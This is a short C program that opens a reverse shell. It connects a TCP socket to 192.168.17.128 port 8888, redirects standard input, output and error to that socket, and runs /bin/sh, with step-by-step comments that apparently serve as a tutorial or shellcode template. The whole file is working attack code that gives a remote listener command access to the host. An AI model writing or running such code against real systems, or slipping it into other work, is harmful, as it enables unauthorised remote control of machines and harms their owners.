#include <netinet/in.h>
#include <unistd.h>

int main() {
    int s;
    struct sockaddr_in addr;

    //// Step 1: Create socket
    //// AF_INET = 2
    //// SOCK_STREAM = 1
    s = socket(AF_INET, SOCK_STREAM, 0);

    //// Step 2: Connect
    addr.sin_family = AF_INET; // AF_INET = 2
    addr.sin_port = htons(8888); //Port to connect, default is 8888
    addr.sin_addr.s_addr = inet_addr("192.168.17.128"); //Connect to 192.168.17.128
    connect(s, (struct sockaddr*)&addr, sizeof(addr)); //sizeof(addr) is 16 bytes

    //// Step 3: Redirect stdin, stdout and stderr to socket
    dup2(s, STDERR_FILENO);
    dup2(s, STDOUT_FILENO);
    dup2(s, STDIN_FILENO);

    //// Step 4: Execute "/bin/sh"
    execve("/bin/sh", NULL, NULL);

    return 0;
}

